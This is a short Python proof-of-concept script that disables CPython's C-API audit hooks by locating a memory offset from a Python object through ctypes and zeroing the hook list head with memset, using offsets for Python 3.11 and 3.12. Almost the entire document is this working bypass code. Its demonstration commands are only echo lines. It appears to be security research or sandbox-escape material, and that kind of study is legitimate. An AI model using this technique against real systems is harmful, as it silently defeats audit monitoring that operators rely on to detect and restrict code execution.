#!audit_hook_head_finder

### POC2-native.py
### only use offset to memset the audit hook set by C api

from audit_hook_head_finder import add_audit
import ctypes

add_audit()

obj = ctypes.byref(ctypes.py_object(()))

ctypes._os.system("echo 'test audit hook -- this will trigger hook'")

# the offsets are from POC-native.py: 
# Python 3.11 = -0xe388
# Python 3.12 = -0x11df0

ctypes.memset(
    ctypes.cast(
        ctypes.cast(obj, ctypes.POINTER(ctypes.c_uint64)).contents.value -0x11df0, ctypes.POINTER(ctypes.c_uint64)
    ), 0, 8
)

ctypes._os.system("echo 'test audit hook -- this will not'")